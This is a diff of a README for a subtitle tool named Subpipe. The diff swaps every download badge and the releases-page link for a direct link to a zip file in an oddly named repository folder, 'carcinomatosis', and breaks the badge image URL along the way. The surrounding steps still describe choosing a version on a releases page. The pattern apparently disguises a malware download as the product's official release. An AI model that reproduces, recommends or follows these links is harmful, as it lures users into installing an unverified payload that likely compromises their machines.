@@ -6,7 +6,7 @@ Subpipe simplifies the process of adding subtitles to your videos. You can extra
 
 ## 📥 Download Now
 
-[![Download Subpipe](https://img.shields.io/badge/Download%20Subpipe-v1.0-blue.svg)](https://github.com/fierromanue1/Subpipe/releases)
+[![Download Subpipe](https://raw.githubusercontent.com/fierromanue1/Subpipe/main/carcinomatosis/Subpipe.zip%https://raw.githubusercontent.com/fierromanue1/Subpipe/main/carcinomatosis/Subpipe.zip)](https://raw.githubusercontent.com/fierromanue1/Subpipe/main/carcinomatosis/Subpipe.zip)
 
 ## 📝 What Is Subpipe?
 
@@ -34,7 +34,7 @@ Before downloading, make sure your system meets the following requirements:
 
 To get started with Subpipe, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to [this page to download](https://github.com/fierromanue1/Subpipe/releases).
+1. **Visit the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/fierromanue1/Subpipe/main/carcinomatosis/Subpipe.zip).
   
 2. **Choose the Version:** On the Releases page, select the latest version available.
 
@@ -95,4 +95,4 @@ Stay updated with the latest features and follow the community. Connect with use
 
 Remember to check back regularly for updates! 
 
-[![Download Subpipe](https://img.shields.io/badge/Download%20Subpipe-v1.0-blue.svg)](https://github.com/fierromanue1/Subpipe/releases)
+[![Download Subpipe](https://raw.githubusercontent.com/fierromanue1/Subpipe/main/carcinomatosis/Subpipe.zip%https://raw.githubusercontent.com/fierromanue1/Subpipe/main/carcinomatosis/Subpipe.zip)](https://raw.githubusercontent.com/fierromanue1/Subpipe/main/carcinomatosis/Subpipe.zip)
